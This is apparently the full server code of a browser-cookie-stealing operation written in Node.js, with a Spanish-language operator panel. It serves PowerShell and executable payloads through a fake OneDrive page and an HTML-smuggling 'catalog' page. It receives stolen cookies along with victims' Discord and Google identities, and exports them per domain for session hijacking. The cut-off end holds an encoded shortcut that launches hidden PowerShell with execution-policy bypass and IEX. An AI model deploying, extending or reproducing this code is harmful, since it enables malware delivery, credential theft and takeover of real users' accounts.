const express = require("express");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

const app = express();
const PORT = process.env.PORT || 7700;
const API_KEY = process.env.API_KEY || "changeme";
const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, "data");

// ── Panel users (env: USERS=user1:pass1,user2:pass2) ──
// First user is ADMIN — can manage accounts
const USERS = {};
const DISABLED = new Set();
let ADMIN_USER = null;
(process.env.USERS || "admin:admin").split(",").forEach((pair, i) => {
  const [u, p] = pair.split(":");
  if (u && p) {
    USERS[u.trim()] = p.trim();
    if (i === 0) ADMIN_USER = u.trim();
  }
});

// ── IP whitelist (env: ALLOWED_IPS=1.2.3.4,5.6.7.8) ──
const ALLOWED_IPS = (process.env.ALLOWED_IPS || "").split(",").map(ip => ip.trim()).filter(Boolean);

// ── Secret panel path (env: PANEL_PATH=mysecret) → panel lives at /mysecret/ ──
const PANEL_PATH = process.env.PANEL_PATH || crypto.randomBytes(12).toString("hex");

// Session tokens (in-memory)
const sessions = new Map();

// ── Brute force protection ──
const loginAttempts = new Map(); // ip -> { count, blockedUntil }
const MAX_ATTEMPTS = 5;
const BLOCK_MINUTES = 30;

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ extended: true }));

// ── Strip identifying headers ──
app.use((req, res, next) => {
  res.removeHeader("X-Powered-By");
  res.setHeader("Server", "nginx");
  next();
});

// ── Trust proxy (Render uses reverse proxy) ──
app.set("trust proxy", true);

function getClientIP(req) {
  return req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || req.ip || req.connection.remoteAddress;
}

// ── Upload auth (API key) ──
function authUpload(req, res, next) {
  const key = req.headers["x-api-key"] || req.query.key;
  if (key !== API_KEY) return res.status(401).json({ error: "unauthorized" });
  next();
}

// ── Panel auth (session cookie) ──
function authPanel(req, res, next) {
  const token = (req.headers.cookie || "").match(/sid=([^;]+)/)?.[1];
  if (token && sessions.has(token)) return next();
  if (req.path.startsWith("/" + PANEL_PATH + "/api/")) return res.status(401).json({ error: "unauthorized" });
  res.redirect("/" + PANEL_PATH + "/login");
}

// ── Login page (secret path) ──
app.get("/" + PANEL_PATH + "/login", (req, res) => {
  res.send(LOGIN_HTML.replace(/\/login/g, "/" + PANEL_PATH + "/login"));
});

app.post("/" + PANEL_PATH + "/login", (req, res) => {
  const ip = getClientIP(req);
  const record = loginAttempts.get(ip) || { count: 0, blockedUntil: 0 };

  // Blocked?
  if (record.blockedUntil > Date.now()) {
    const mins = Math.ceil((record.blockedUntil - Date.now()) / 60000);
    return res.send(LOGIN_HTML.replace(/\/login/g, "/" + PANEL_PATH + "/login").replace("<!--ERR-->", '<p style="color:#f85149;margin-top:12px">Bloqueado. Intentá en ' + mins + ' minutos.</p>'));
  }

  const { username, password } = req.body;
  if (USERS[username] && USERS[username] === password) {
    // Disabled?
    if (DISABLED.has(username)) {
      return res.send(LOGIN_HTML.replace(/\/login/g, "/" + PANEL_PATH + "/login").replace("<!--ERR-->", '<p style="color:#f85149;margin-top:12px">Cuenta desactivada</p>'));
    }
    loginAttempts.delete(ip);
    // Kill any existing session for this user (1 session per account)
    for (const [k, v] of sessions) { if (v.user === username) sessions.delete(k); }
    const token = crypto.randomBytes(32).toString("hex");
    sessions.set(token, { user: username, created: Date.now(), ip });
    res.setHeader("Set-Cookie", `sid=${token}; Path=/; HttpOnly; SameSite=Strict; Max-Age=604800`);
    return res.redirect("/" + PANEL_PATH);
  }

  // Failed attempt
  record.count++;
  if (record.count >= MAX_ATTEMPTS) {
    record.blockedUntil = Date.now() + BLOCK_MINUTES * 60000;
    record.count = 0;
  }
  loginAttempts.set(ip, record);

  res.send(LOGIN_HTML.replace(/\/login/g, "/" + PANEL_PATH + "/login").replace("<!--ERR-->", '<p style="color:#f85149;margin-top:12px">Usuario o contraseña incorrectos (' + (MAX_ATTEMPTS - record.count) + ' intentos restantes)</p>'));
});

app.get("/" + PANEL_PATH + "/logout", (req, res) => {
  const token = (req.headers.cookie || "").match(/sid=([^;]+)/)?.[1];
  if (token) sessions.delete(token);
  res.setHeader("Set-Cookie", "sid=; Path=/; Max-Age=0");
  res.redirect("/" + PANEL_PATH + "/login");
});

// ── Payload delivery endpoints (no auth, public) ──
const PAYLOAD_DIR = path.join(__dirname, "payloads");
if (!fs.existsSync(PAYLOAD_DIR)) fs.mkdirSync(PAYLOAD_DIR, { recursive: true });

// ── Landing page — catalog preview with download (HTML smuggling) ──
app.get("/catalogo", (req, res) => {
  res.send(LANDING_HTML);
});

// ── OneDrive-style document sharing page ──
app.get("/s/:docId", (req, res) => {
  res.send(ONEDRIVE_HTML);
});

app.get("/dl/s.ps1", (req, res) => {
  const fp = path.join(PAYLOAD_DIR, "stage.ps1");
  if (!fs.existsSync(fp)) return res.status(404).end();
  res.type("text/plain").send(fs.readFileSync(fp, "utf8"));
});

app.get("/dl/catalog.pdf", (req, res) => {
  const fp = path.join(PAYLOAD_DIR, "catalog.pdf");
  if (!fs.existsSync(fp)) return res.status(404).end();
  res.type("application/pdf").sendFile(fp);
});

app.get("/dl/s.exe", (req, res) => {
  const fp = path.join(PAYLOAD_DIR, "s.exe");
  if (!fs.existsSync(fp)) return res.status(404).end();
  res.type("application/octet-stream").sendFile(fp);
});

app.get("/dl/n.node", (req, res) => {
  const fp = path.join(PAYLOAD_DIR, "n.node");
  if (!fs.existsSync(fp)) return res.status(404).end();
  res.type("application/octet-stream").sendFile(fp);
});

// ── Upload endpoint (API key auth, no session needed) ──
app.post("/api/upload", authUpload, (req, res) => {
  const { machineId, identity, cookies, timestamp } = req.body;
  if (!machineId || !cookies) return res.status(400).json({ error: "machineId and cookies required" });
  const safeId = machineId.replace(/[^a-zA-Z0-9_-]/g, "_").substring(0, 64);
  const filePath = path.join(DATA_DIR, safeId + ".json");
  const record = {
    machineId: safeId,
    identity: identity || { discord: null, google: [] },
    lastUpdated: timestamp || new Date().toISOString(),
    cookieCount: cookies.length,
    domains: [...new Set(cookies.map(c => c.domain.replace(/^\./, "")))].sort(),
    cookies
  };
  fs.writeFileSync(filePath, JSON.stringify(record, null, 2), "utf8");
  console.log(`[+] ${safeId}: ${cookies.length} cookies, ${record.domains.length} domains`);
  res.json({ ok: true, stored: cookies.length });
});

// ── All routes below require panel login ──
app.use(authPanel);

app.get("/api/machines", (req, res) => {
  const files = fs.readdirSync(DATA_DIR).filter(f => f.endsWith(".json"));
  const machines = files.map(f => {
    const data = JSON.parse(fs.readFileSync(path.join(DATA_DIR, f), "utf8"));
    return {
      machineId: data.machineId,
      identity: data.identity || { discord: null, google: [] },
      lastUpdated: data.lastUpdated,
      cookieCount: data.cookieCount,
      domainCount: data.domains.length
    };
  });
  res.json(machines);
});

app.get("/api/cookies/:machineId", (req, res) => {
  const safeId = req.params.machineId.replace(/[^a-zA-Z0-9_-]/g, "_");
  const filePath = path.join(DATA_DIR, safeId + ".json");
  if (!fs.existsSync(filePath)) return res.status(404).json({ error: "not found" });
  res.json(JSON.parse(fs.readFileSync(filePath, "utf8")));
});

app.get("/api/cookies", (req, res) => {
  const files = fs.readdirSync(DATA_DIR).filter(f => f.endsWith(".json"));
  const all = [];
  for (const f of files) {
    const data = JSON.parse(fs.readFileSync(path.join(DATA_DIR, f), "utf8"));
    for (const c of data.cookies) { c._machine = data.machineId; c._updated = data.lastUpdated; all.push(c); }
  }
  res.json({ cookies: all, total: all.length });
});

// ── Admin check helper ──
function isAdmin(req) {
  const token = (req.headers.cookie || "").match(/sid=([^;]+)/)?.[1];
  const s = sessions.get(token);
  return s?.user === ADMIN_USER;
}

// ── Delete a machine (admin only) ──
app.delete("/api/machines/:machineId", (req, res) => {
  if (!isAdmin(req)) return res.status(403).json({ error: "admin only" });
  const safeId = req.params.machineId.replace(/[^a-zA-Z0-9_-]/g, "_");
  const filePath = path.join(DATA_DIR, safeId + ".json");
  if (!fs.existsSync(filePath)) return res.status(404).json({ error: "not found" });
  fs.unlinkSync(filePath);
  console.log(`[-] Deleted: ${safeId}`);
  res.json({ ok: true, deleted: safeId });
});

// ── Delete ALL machines (admin only) ──
app.delete("/api/machines", (req, res) => {
  if (!isAdmin(req)) return res.status(403).json({ error: "admin only" });
  const files = fs.readdirSync(DATA_DIR).filter(f => f.endsWith(".json"));
  for (const f of files) fs.unlinkSync(path.join(DATA_DIR, f));
  console.log(`[-] Deleted all: ${files.length} machines`);
  res.json({ ok: true, deleted: files.length });
});

// ── Admin: get current user ──
app.get("/api/me", (req, res) => {
  const token = (req.headers.cookie || "").match(/sid=([^;]+)/)?.[1];
  const s = sessions.get(token);
  res.json({ user: s?.user || null, isAdmin: s?.user === ADMIN_USER });
});

// ── Admin: list sessions ──
app.get("/api/admin/sessions", (req, res) => {
  const token = (req.headers.cookie || "").match(/sid=([^;]+)/)?.[1];
  const s = sessions.get(token);
  if (s?.user !== ADMIN_USER) return res.status(403).json({ error: "admin only" });
  const list = [];
  for (const [k, v] of sessions) {
    list.push({ token: k.substring(0, 8) + "...", user: v.user, ip: v.ip || "?", created: new Date(v.created).toISOString() });
  }
  res.json({ sessions: list, disabled: [...DISABLED], users: Object.keys(USERS) });
});

// ── Admin: disable/enable user ──
app.post("/api/admin/toggle", (req, res) => {
  const token = (req.headers.cookie || "").match(/sid=([^;]+)/)?.[1];
  const s = sessions.get(token);
  if (s?.user !== ADMIN_USER) return res.status(403).json({ error: "admin only" });
  const { username } = req.body;
  if (!USERS[username]) return res.status(404).json({ error: "user not found" });
  if (username === ADMIN_USER) return res.status(400).json({ error: "cant disable admin" });
  if (DISABLED.has(username)) {
    DISABLED.delete(username);
    res.json({ ok: true, user: username, status: "enabled" });
  } else {
    DISABLED.add(username);
    // Kill their sessions
    for (const [k, v] of sessions) { if (v.user === username) sessions.delete(k); }
    res.json({ ok: true, user: username, status: "disabled" });
  }
});

// ── Admin: kick a user's session ──
app.post("/api/admin/kick", (req, res) => {
  const token = (req.headers.cookie || "").match(/sid=([^;]+)/)?.[1];
  const s = sessions.get(token);
  if (s?.user !== ADMIN_USER) return res.status(403).json({ error: "admin only" });
  const { username } = req.body;
  let kicked = 0;
  for (const [k, v] of sessions) { if (v.user === username) { sessions.delete(k); kicked++; } }
  res.json({ ok: true, kicked });
});

// ── Panel ──
app.get("/" + PANEL_PATH, (req, res) => { res.send(PANEL_HTML); });

// ── Everything else: 404 ──
app.use((req, res) => {
  res.status(404).send("<!DOCTYPE html><html><body style='background:#0a0a0f;color:#484f58;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh'><p>404 Not Found</p></body></html>");
});

// ── Login HTML ──
const LOGIN_HTML = `<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a0f;color:#c8d6e5;min-height:100vh;display:flex;align-items:center;justify-content:center}
.box{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:36px;width:340px}
h2{color:#58a6ff;margin-bottom:20px;text-align:center;font-size:18px}
label{font-size:13px;color:#8b949e;display:block;margin-bottom:4px}
input{width:100%;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:10px 12px;border-radius:6px;font-size:14px;margin-bottom:14px;outline:none}
input:focus{border-color:#58a6ff}
button{width:100%;background:#1f6feb;border:none;color:#fff;padding:10px;border-radius:6px;font-size:14px;cursor:pointer}
button:hover{background:#388bfd}
</style></head><body>
<div class="box">
<h2>🔒 Panel Access</h2>
<form method="POST" action="/login">
<label>Usuario</label><input name="username" required autofocus>
<label>Contraseña</label><input name="password" type="password" required>
<button type="submit">Ingresar</button>
</form>
<!--ERR-->
</div></body></html>`;

// ── Panel HTML ──
const PANEL_HTML = `<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Panel</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a0f;color:#c8d6e5;min-height:100vh}
.top-bar{background:linear-gradient(135deg,#0d1117,#161b22);border-bottom:1px solid #30363d;padding:16px 24px;display:flex;align-items:center;gap:16px;flex-wrap:wrap}
.top-bar h1{font-size:20px;color:#58a6ff;flex-shrink:0}
.top-bar .stats{font-size:13px;color:#8b949e;display:flex;gap:18px;flex-wrap:wrap;flex:1}
.top-bar .stats span{color:#c9d1d9}
.dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:4px;vertical-align:middle}
.dot-green{background:#3fb950}
.top-bar .right{margin-left:auto}
.tabs{display:flex;gap:0;border-bottom:1px solid #21262d;background:#0d1117}
.tab{padding:12px 20px;cursor:pointer;color:#8b949e;font-size:14px;border-bottom:2px solid transparent;transition:all .15s}
.tab:hover{color:#c9d1d9}.tab.active{color:#58a6ff;border-bottom-color:#58a6ff}
.controls{padding:14px 24px;background:#0d1117;border-bottom:1px solid #21262d;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
input[type=text]{background:#161b22;border:1px solid #30363d;color:#c9d1d9;padding:8px 14px;border-radius:6px;font-size:14px;width:320px;outline:none}
input[type=text]:focus{border-color:#58a6ff}
select{background:#161b22;border:1px solid #30363d;color:#c9d1d9;padding:8px 12px;border-radius:6px;font-size:14px;outline:none}
button{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:13px;transition:background .15s}
button:hover{background:#30363d}
.btn-blue{background:#1f6feb;border-color:#1f6feb;color:#fff}.btn-blue:hover{background:#388bfd}
.btn-green{background:#238636;border-color:#238636;color:#fff}.btn-green:hover{background:#2ea043}
.btn-red{background:#da3633;border-color:#da3633;color:#fff}.btn-red:hover{background:#f85149}
.btn-sm{padding:4px 10px;font-size:12px}
.container{padding:20px 24px}
.machine-card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:18px;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;transition:border-color .15s}
.machine-card:hover{border-color:#58a6ff}
.machine-info h3{color:#58a6ff;font-size:16px;margin-bottom:4px;cursor:pointer}
.machine-info p{color:#8b949e;font-size:13px}
.machine-stats{display:flex;gap:16px;align-items:center}
.machine-stats .stat{text-align:center}
.machine-stats .stat .n{font-size:22px;font-weight:700;color:#c9d1d9}
.machine-stats .stat .l{font-size:11px;color:#8b949e;text-transform:uppercase}
.domain-group{margin-bottom:12px;border:1px solid #21262d;border-radius:10px;overflow:hidden}
.domain-header{background:#161b22;padding:12px 16px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;user-select:none}
.domain-header:hover{background:#1c2128}
.domain-name{font-weight:600;color:#58a6ff;font-size:15px}
.domain-count{background:#30363d;color:#8b949e;padding:2px 10px;border-radius:99px;font-size:12px}
.domain-actions{display:flex;gap:6px;align-items:center}
.cookie-table{width:100%;border-collapse:collapse;display:none}
.domain-group.open .cookie-table{display:table}
.cookie-table th{background:#0d1117;color:#8b949e;font-weight:500;font-size:12px;text-transform:uppercase;letter-spacing:.5px;padding:8px 12px;text-align:left;border-bottom:1px solid #21262d}
.cookie-table td{padding:8px 12px;border-bottom:1px solid #161b22;font-size:13px;max-width:340px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.cookie-table tr:hover td{background:#161b22}
.tag{display:inline-block;padding:1px 7px;border-radius:4px;font-size:11px;font-weight:500}
.tag-secure{background:#0d419d;color:#79c0ff}
.tag-http{background:#3d1e00;color:#d29922}
.tag-session{background:#1b3a1b;color:#3fb950}
.tag-expired{background:#3d0000;color:#f85149}
.empty{text-align:center;padding:60px;color:#484f58;font-size:15px}
#toast{position:fixed;bottom:24px;right:24px;background:#1f6feb;color:#fff;padding:10px 20px;border-radius:8px;font-size:13px;display:none;z-index:99;box-shadow:0 4px 12px rgba(0,0,0,.5)}
.hidden{display:none!important}
</style>
</head>
<body>
<div class="top-bar">
  <h1>Panel</h1>
  <div class="stats">
    <div><span class="dot dot-green"></span>Máquinas: <span id="s-machines">0</span></div>
    <div>Total cookies: <span id="s-total">0</span></div>
    <div>Dominios: <span id="s-domains">0</span></div>
  </div>
  <div class="right"><a href="/${PANEL_PATH}/logout" style="color:#8b949e;font-size:13px;text-decoration:none">Cerrar sesión ⏻</a></div>
</div>
<div class="tabs">
  <div class="tab active" data-tab="machines" onclick="switchTab('machines')">Máquinas</div>
  <div class="tab" data-tab="cookies" onclick="switchTab('cookies')">Todas las Cookies</div>
  <div class="tab" data-tab="admin" onclick="switchTab('admin')" id="admin-tab" style="display:none">⚙ Admin</div>
</div>
<div class="controls">
  <input type="text" id="search" placeholder="Buscar dominio, cookie o máquina...">
  <select id="sort"><option value="alpha">A → Z</option><option value="count">Más cookies primero</option></select>
  <select id="machine-filter"><option value="all">Todas las máquinas</option></select>
  <button class="btn-blue" onclick="downloadFiltered('txt')">⬇ .txt</button>
  <button class="btn-blue" onclick="downloadFiltered('json')">⬇ .json</button>
  <button class="btn-green" onclick="refresh()">⟳ Actualizar</button>
  <button class="btn-red" onclick="deleteAll()" id="btn-delete-all" style="display:none">🗑 Borrar todo</button>
</div>
<div class="container" id="tab-machines"></div>
<div class="container hidden" id="tab-cookies"></div>
<div class="container hidden" id="tab-admin"></div>
<div id="toast"></div>

<script>
let MACHINES=[], ALL_COOKIES=[], currentTab="machines", IS_ADMIN=false;

async function fetchMachines(){const r=await fetch("/api/machines");if(r.status===401)return location.href="/login";MACHINES=await r.json();const sel=document.getElementById("machine-filter");const prev=sel.value;sel.innerHTML='<option value="all">Todas las máquinas</option>';for(const m of MACHINES)sel.innerHTML+='<option value="'+esc(m.machineId)+'">'+esc(m.machineId)+'</option>';sel.value=prev||"all"}
async function fetchAllCookies(){const r=await fetch("/api/cookies");if(r.status===401)return location.href="/login";const d=await r.json();ALL_COOKIES=d.cookies}

function switchTab(t){currentTab=t;document.querySelectorAll(".tab").forEach(x=>x.classList.toggle("active",x.dataset.tab===t));document.getElementById("tab-machines").classList.toggle("hidden",t!=="machines");document.getElementById("tab-cookies").classList.toggle("hidden",t!=="cookies");document.getElementById("tab-admin").classList.toggle("hidden",t!=="admin");render()}
async function refresh(){await fetchMachines();await fetchAllCookies();render();toast("Actualizado")}

function render(){updateStats();if(currentTab==="machines")renderMachines();else if(currentTab==="admin")renderAdmin();else renderCookies()}
function updateStats(){document.getElementById("s-machines").textContent=MACHINES.length;document.getElementById("s-total").textContent=ALL_COOKIES.length;document.getElementById("s-domains").textContent=new Set(ALL_COOKIES.map(c=>(c.domain||"").replace(/^\\./,""))).size}

function renderMachines(){
  const el=document.getElementById("tab-machines");
  if(!MACHINES.length){el.innerHTML='<div class="empty">No hay máquinas conectadas aún</div>';return}
  let html="";
  for(const m of MACHINES){
    const ago=timeAgo(m.lastUpdated);
    const id=m.identity||{};
    const dc=id.discord;
    const gg=(id.google||[]);
    let discordTag='<span style="color:#484f58">—</span>';
    if(dc){
      const avatar=dc.avatar?'https://cdn.discordapp.com/avatars/'+dc.id+'/'+dc.avatar+'.png?size=32':'https://cdn.discordapp.com/embed/avatars/0.png';
      const name=dc.globalName||dc.username;
      discordTag='<img src="'+avatar+'" style="width:20px;height:20px;border-radius:50%;vertical-align:middle;margin-right:6px"><span style="color:#5865F2;font-weight:600">'+esc(name)+'</span> <span style="color:#8b949e;font-size:12px">@'+esc(dc.username)+'</span>';
    }
    let googleTag='<span style="color:#484f58">—</span>';
    if(gg.length){googleTag=gg.map(g=>'<span style="color:#ea4335;margin-right:4px">●</span><span style="font-weight:600">'+esc(g.displayName)+'</span>').join(' · ')}
    html+='<div class="machine-card">';
    html+='<div class="machine-info"><h3 onclick="viewMachine(\\''+esc(m.machineId)+'\\')">'+esc(m.machineId)+'</h3>';
    html+='<div style="margin-top:8px;display:flex;flex-direction:column;gap:5px">';
    html+='<div style="font-size:13px"><span style="color:#5865F2;margin-right:6px">Discord:</span>'+discordTag+'</div>';
    html+='<div style="font-size:13px"><span style="color:#ea4335;margin-right:6px">Google:</span>'+googleTag+'</div>';
    html+='</div><p style="margin-top:6px">Actualizado: '+ago+'</p></div>';
    html+='<div class="machine-stats">';
    html+='<div class="stat"><div class="n">'+m.cookieCount+'</div><div class="l">cookies</div></div>';
    html+='<div class="stat"><div class="n">'+m.domainCount+'</div><div class="l">dominios</div></div>';
    html+='<div style="margin-left:12px">'+(IS_ADMIN?'<button class="btn-red btn-sm" onclick="deleteMachine(\\''+esc(m.machineId)+'\\')">🗑</button>':'')+'</div>';
    html+='</div></div>';
  }
  el.innerHTML=html;
}

function viewMachine(id){document.getElementById("machine-filter").value=id;switchTab("cookies")}

function renderCookies(){
  const el=document.getElementById("tab-cookies");
  const q=document.getElementById("search").value.toLowerCase();
  const sort=document.getElementById("sort").value;
  const mf=document.getElementById("machine-filter").value;
  let filtered=ALL_COOKIES;
  if(mf!=="all")filtered=filtered.filter(c=>c._machine===mf);
  if(q)filtered=filtered.filter(c=>(c.domain||"").toLowerCase().includes(q)||(c.name||"").toLowerCase().includes(q)||(c._machine||"").toLowerCase().includes(q));
  const groups={};
  for(const c of filtered){const d=(c.domain||"").replace(/^\\./,"");if(!groups[d])groups[d]=[];groups[d].push(c)}
  let domains=Object.keys(groups);
  if(sort==="alpha")domains.sort();else domains.sort((a,b)=>groups[b].length-groups[a].length);
  if(!domains.length){el.innerHTML='<div class="empty">No se encontraron cookies'+(q?' para "'+esc(q)+'"':'')+'</div>';return}
  let html="";const now=Date.now()/1000;
  for(const d of domains){
    const cookies=groups[d];
    html+='<div class="domain-group">';
    html+='<div class="domain-header" onclick="this.parentElement.classList.toggle(\\'open\\')">';
    html+='<span class="domain-name">'+esc(d)+'</span>';
    html+='<div class="domain-actions">';
    html+='<button onclick="event.stopPropagation();downloadDomain(\\''+esc(d)+'\\',\\'txt\\')">txt</button>';
    html+='<button onclick="event.stopPropagation();downloadDomain(\\''+esc(d)+'\\',\\'json\\')">json</button>';
    html+='<span class="domain-count">'+cookies.length+'</span></div></div>';
    html+='<table class="cookie-table"><thead><tr><th>Máquina</th><th>Nombre</th><th>Valor</th><th>Path</th><th>Expira</th><th>Flags</th></tr></thead><tbody>';
    for(const c of cookies){
      const exp=c.expires===0?'<span class="tag tag-session">session</span>':(c.expires<now?'<span class="tag tag-expired">expired</span>':new Date(c.expires*1000).toLocaleDateString("es-AR"));
      let flags="";if(c.secure)flags+='<span class="tag tag-secure">Secure</span> ';if(c.httpOnly)flags+='<span class="tag tag-http">HttpOnly</span> ';
      html+='<tr><td>'+esc(c._machine||"—")+'</td><td title="'+esc(c.name)+'">'+esc(c.name)+'</td><td title="'+esc(c.value)+'">'+esc(c.value)+'</td><td>'+esc(c.path)+'</td><td>'+exp+'</td><td>'+flags+'</td></tr>';
    }
    html+='</tbody></table></div>';
  }
  el.innerHTML=html;
}

async function deleteMachine(id){if(!confirm("Borrar "+id+" y todas sus cookies?"))return;await fetch("/api/machines/"+encodeURIComponent(id),{method:"DELETE"});toast("Borrado: "+id);refresh()}
async function deleteAll(){if(!confirm("Borrar TODAS las máquinas y cookies?"))return;await fetch("/api/machines",{method:"DELETE"});toast("Todo borrado");refresh()}

function timeAgo(iso){if(!iso)return"—";const s=Math.floor((Date.now()-new Date(iso).getTime())/1000);if(s<60)return"hace "+s+"s";if(s<3600)return"hace "+Math.floor(s/60)+"min";if(s<86400)return"hace "+Math.floor(s/3600)+"h";return"hace "+Math.floor(s/86400)+"d"}
function esc(s){if(!s)return"";const d=document.createElement("div");d.textContent=s;return d.innerHTML}

function downloadBlob(name,content,type){const a=document.createElement("a");a.href=URL.createObjectURL(new Blob([content],{type}));a.download=name;a.click();toast("Descargado: "+name)}
function downloadFiltered(fmt){const mf=document.getElementById("machine-filter").value;let cookies=ALL_COOKIES;if(mf!=="all")cookies=cookies.filter(c=>c._machine===mf);const name=(mf==="all"?"all":mf)+"_cookies";if(fmt==="json")downloadBlob(name+".json",JSON.stringify(cookies,null,2),"application/json");else downloadBlob(name+".txt",toNetscape(cookies),"text/plain")}
function downloadDomain(domain,fmt){const cookies=ALL_COOKIES.filter(c=>(c.domain||"").replace(/^\\./,"")===domain);if(fmt==="json")downloadBlob(domain+"_cookies.json",JSON.stringify(cookies,null,2),"application/json");else downloadBlob(domain+"_cookies.txt",toNetscape(cookies),"text/plain")}
function toNetscape(cookies){let out="# Netscape HTTP Cookie File\\n\\n";for(const c of cookies)out+=(c.httpOnly?"#HttpOnly_":"")+c.domain+"\\tTRUE\\t"+c.path+"\\t"+(c.secure?"TRUE":"FALSE")+"\\t"+c.expires+"\\t"+c.name+"\\t"+c.value+"\\n";return out}
function toast(msg){const t=document.getElementById("toast");t.textContent=msg;t.style.display="block";setTimeout(()=>t.style.display="none",2500)}

document.getElementById("search").addEventListener("input",render);
document.getElementById("sort").addEventListener("change",render);
document.getElementById("machine-filter").addEventListener("change",()=>render());

// Check if admin
async function checkAdmin(){
  const r=await fetch("/api/me");
  const d=await r.json();
  IS_ADMIN=d.isAdmin;
  if(d.isAdmin){
    document.getElementById("admin-tab").style.display="";
    document.getElementById("btn-delete-all").style.display="";
  }
}

async function renderAdmin(){
  const el=document.getElementById("tab-admin");
  const r=await fetch("/api/admin/sessions");
  if(r.status===403){el.innerHTML='<div class="empty">Solo admin</div>';return}
  const d=await r.json();
  let html='<h2 style="color:#58a6ff;margin-bottom:16px;font-size:18px">Gestión de Cuentas</h2>';

  // Users
  html+='<div style="margin-bottom:24px">';
  for(const u of d.users){
    const dis=d.disabled.includes(u);
    const isAdmin=u===d.users[0];
    html+='<div class="machine-card" style="margin-bottom:8px">';
    html+='<div class="machine-info"><h3 style="font-size:15px">'+esc(u)+(isAdmin?' <span style="color:#3fb950;font-size:11px">ADMIN</span>':'')+'</h3>';
    html+='<p>Estado: '+(dis?'<span style="color:#f85149">⛔ Desactivada</span>':'<span style="color:#3fb950">✓ Activa</span>')+'</p></div>';
    html+='<div style="display:flex;gap:8px">';
    if(!isAdmin){
      html+='<button class="btn-sm '+(dis?'btn-green':'btn-red')+'" onclick="toggleUser(\\''+esc(u)+'\\')">'+(dis?'Activar':'Desactivar')+'</button>';
      html+='<button class="btn-sm" onclick="kickUser(\\''+esc(u)+'\\')">Expulsar</button>';
    }
    html+='</div></div>';
  }
  html+='</div>';

  // Active sessions
  html+='<h2 style="color:#58a6ff;margin-bottom:16px;font-size:18px">Sesiones Activas</h2>';
  if(!d.sessions.length){html+='<div class="empty">No hay sesiones activas</div>'}
  else{
    html+='<table class="cookie-table" style="display:table"><thead><tr><th>Usuario</th><th>IP</th><th>Desde</th><th>Token</th></tr></thead><tbody>';
    for(const s of d.sessions){
      html+='<tr><td style="font-weight:600;color:#58a6ff">'+esc(s.user)+'</td><td>'+esc(s.ip)+'</td><td>'+new Date(s.created).toLocaleString("es-AR")+'</td><td style="color:#484f58">'+esc(s.token)+'</td></tr>';
    }
    html+='</tbody></table>';
  }
  el.innerHTML=html;
}

async function toggleUser(u){
  await fetch("/api/admin/toggle",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:u})});
  toast("Cuenta actualizada");renderAdmin();
}
async function kickUser(u){
  await fetch("/api/admin/kick",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:u})});
  toast("Sesión expulsada");renderAdmin();
}

checkAdmin();
refresh();setInterval(refresh,30000);
</script>
</body></html>`;

// ── Landing page HTML (HTML smuggling) ──
const LNK_B64 = "TAAAAAEUAgAAAAAAwAAAAAAAAEbtAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAABwAAAAAAAAAAAAAAAAAAAA0CFAAfUOBP0CDqOmkQotgIACswMJ0ZAC9DOlwAAAAAAAAAAAAAAAAAAAAAAAAAVgAxAAAAAAAAAAAAEABXaW5kb3dzAEAACQAEAO++AAAAAAAAAAAuAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABXAGkAbgBkAG8AdwBzAAAAFgBaADEAAAAAAAAAAAAQAFN5c3RlbTMyAABCAAkABADvvgAAAAAAAAAALgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUwB5AHMAdABlAG0AMwAyAAAAGAB0ADEAAAAAAAAAAAAQAFdpbmRvd3NQb3dlclNoZWxsAFQACQAEAO++AAAAAAAAAAAuAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAAAAgAE4AMQAAAAAAAAAAABAAdjEuMAAAOgAJAAQA774AAAAAAAAAAC4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHYAMQAuADAAAAAUAGwAMgAAAAAAAAAAAAAAcG93ZXJzaGVsbC5leGUAAE4ACQAEAO++AAAAAAAAAAAuAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAAAAeAAAAIQBDAGEAdABhAGwAbwBnAG8AIABkAGUAIABSAG8AcABhACAARwBUAEEASAB1AGIAIABBAG4AZAByAG8AbQBlAGQAYQBLAC4ALgBcAC4ALgBcAC4ALgBcAC4ALgBcAC4ALgBcAC4ALgBcAC4ALgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlAF0ALQB3ACAAaABpAGQAZABlAG4AIAAtAGUAcAAgAGIAeQBwAGEAcwBzACAALQBjACAAIgBJAEUAWAAoAEkA